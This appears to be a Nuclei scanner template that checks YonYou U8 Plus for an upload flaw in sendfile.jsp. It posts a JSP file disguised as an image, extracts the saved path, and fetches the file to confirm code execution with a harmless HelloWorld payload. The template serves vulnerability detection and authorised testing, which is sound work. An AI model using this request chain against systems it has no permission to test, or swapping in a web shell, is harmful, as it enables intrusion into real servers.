id: YonYouU8Plus-sendfile-uploadToRce

info:
  name: YonYouU8Plus-sendfile-uploadToRce
  author: iSee857
  severity: critical
  description: |
    YonYouU8Plus-sendfile-uploadToRce

http:
  - id: upload-jsp
    method: POST
    path:
      - "{{BaseURL}}/business/common/importdata/sendfile.jsp"
    headers:
      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2yTv7wNpLm"
      Accept: "*/*"
      Connection: "close"
    body: |
      ------WebKitFormBoundaryXqK9dR2yTv7wNpLm
      Content-Disposition: form-data; name="file"; filename="hello.jsp"
      Content-Type: image/jpeg

      <% out.println("HelloWorld");%>
      ------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "hello.jsp"
        part: body
    extractors:
      - type: regex
        name: uploaded_file_path
        part: body
        internal: true
        group: 1
        regex:
          - "value='([^']*?userfile\\default\\temp\\[a-f0-9]+\\.jsp)'"

  - id: access-uploaded-file
    method: GET
    path:
      - "{{BaseURL}}/{{uploaded_file_path}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "HelloWorld"
        part: body
